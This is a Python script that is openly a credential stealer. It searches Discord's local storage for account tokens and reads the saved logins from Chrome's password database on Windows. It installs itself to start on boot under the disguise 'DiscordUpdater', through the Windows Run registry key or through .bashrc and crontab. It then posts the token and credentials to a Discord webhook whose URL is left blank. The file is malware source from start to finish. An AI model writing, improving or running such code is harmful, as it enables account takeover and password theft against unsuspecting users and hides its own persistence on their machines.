import os
import re
import json
import base64
import sqlite3
import shutil
import subprocess
import platform
import requests

platform_os = platform.system().lower()
path = None

if "windows" in platform_os:
    path = os.getenv('APPDATA') + "\\discord"
elif "linux" in platform_os or "darwin" in platform_os:
    path = os.path.expanduser("~") + "/.config/discord"

path += "/Local Storage/leveldb"
token = None
if os.path.exists(path):
    for file_name in os.listdir(path):
        if file_name.endswith(".log") or file_name.endswith(".ldb"):
            with open(f"{path}/{file_name}", "r", errors="ignore") as file:
                content = file.read()
                token = re.findall(r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", content)
                if token:
                    print(f"[+] Discord Token found: {token[0]}")
                    token = token[0]
                    break
if not token:
    print("[-] No Discord Token found.")

creds = None
if platform.system().lower() == "windows":
    db_path = os.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Login Data"
    if os.path.exists(db_path):
        shutil.copy(db_path, "./chrome_login_data")
        try:
            conn = sqlite3.connect("./chrome_login_data")
            cursor = conn.cursor()
            cursor.execute("SELECT action_url, username_value, password_value FROM logins")
            creds = cursor.fetchall()
        except Exception as e:
            print(f"[-] Error retrieving credentials: {e}")
        finally:
            conn.close()
            os.remove("./chrome_login_data")

if platform_os == "windows":
    key = r"HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
    command = f'reg add "{key}" /v DiscordUpdater /t REG_SZ /d "{os.path.abspath(__file__)}" /f'
    subprocess.run(command, shell=True)
elif "linux" in platform_os or "darwin" in platform_os:
    bashrc = os.path.expanduser("~/.bashrc")
    with open(bashrc, "a") as file:
        file.write(f"\npython3 {os.path.abspath(__file__)} &\n")
    subprocess.run(["crontab", "-l", "|", "{", "cat;", "echo", f"'@reboot python3 {os.path.abspath(__file__)}'", ";}", "|", "crontab", "-"], shell=True)

with open(__file__, 'r') as file:
    content = file.read()
encoded_content = base64.b64encode(content.encode('utf-8')).decode('utf-8')

webhook_url = ""  # webhook url
data = {
    "content": f"Discord Token: {token}\n",
    "embeds": []
}

if creds:
    creds_content = "\n".join([f"URL: {cred[0]}, Username: {cred[1]}, Password: {cred[2]}" for cred in creds])
    data["embeds"].append({"title": "Browser Credentials", "description": creds_content})

headers = {"Content-Type": "application/json"}

try:
    requests.post(webhook_url, data=json.dumps(data), headers=headers)
    print("[+] Data sent to webhook.")
except Exception as e:
    print(f"[-] Failed to send data: {e}")

print("[+] Obfuscated payload generated.")
